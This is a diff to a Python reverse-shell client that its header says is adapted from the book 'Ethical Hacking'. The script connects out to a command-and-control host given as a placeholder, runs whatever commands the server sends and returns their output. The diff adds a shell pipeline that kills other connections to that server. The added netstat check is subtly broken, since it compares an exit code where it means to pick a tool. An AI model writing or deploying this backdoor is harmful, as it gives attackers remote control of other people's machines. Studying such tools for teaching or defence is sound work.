@@ -5,7 +5,7 @@
 Description: Reverse Shell script (client) as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
 """
 
-import sys
+import sys,os
 from subprocess import Popen, PIPE
 from socket import *
 
@@ -14,8 +14,8 @@ from socket import *
 #    print( "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0]) )
 #    exit()
 
-serverName = sys.argv[1] if len(sys.argv) > 1 else '<hacker_ip>' # Use CNC (server) ip by default
-serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000 # Use port 8000 by default
+serverName = sys.argv[1] if len(sys.argv) > 1 else '<cnc_ip>' # Use CNC (server) ip by default
+serverPort = sys.argv[2] if len(sys.argv) > 2 else int('<cnc_port>') # Use port cnc server port by default
 
 print("[CONNECTED] SERVER: {} PORT: {}".format(serverName,serverPort) ) 
 
@@ -35,6 +35,9 @@ clientSocket.send('Client Connected!'.encode())
 # Accept/decode any initial messages (commands) from server (max 4064 bytes)
 command = clientSocket.recv(4064).decode()
 
+using_netstat=os.system("{ netstat --version &> /dev/null && echo 1 ; } || echo 0")
+net_vs_ss = 'netstat' if using_netstat == 1 else 0
+
 # Continue receiving commands until server sends 'exit
 while command != 'exit':
     # Prevent blank commands
@@ -42,13 +45,22 @@ while command != 'exit':
         try:
             # Execute any received commands and parse output (output,err)
             proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
-            result, err = proc.communicate()
-            # Send output/err back to server
-            clientSocket.send(result)
+            
+            # If command executes - but we can't parse the response - at least show executed it
+            try:
+                # Send output/err back to server
+                result, err = proc.communicate()
+                clientSocket.send(result)
+            except:
+                clientSocket.send("Processesed command - but couldn't parse output.\n".encode())
+
         except:
             clientSocket.send("Error occurred executing command\n".encode())
     
     # Accept/decode any subsequent commands
     command = (clientSocket.recv(4064)).decode()
+
+    # Get PIDs of any non-established connections to cnc server and kill
+    os.system("{} -tupn | egrep -iv 'ESTAB' | egrep '{}:{}' | sed 's/^.*pid=//' | sed 's/,.*//' | xargs kill &> /dev/null".format(net_vs_ss,serverName,serverPort))
 
 clientSocket.close()
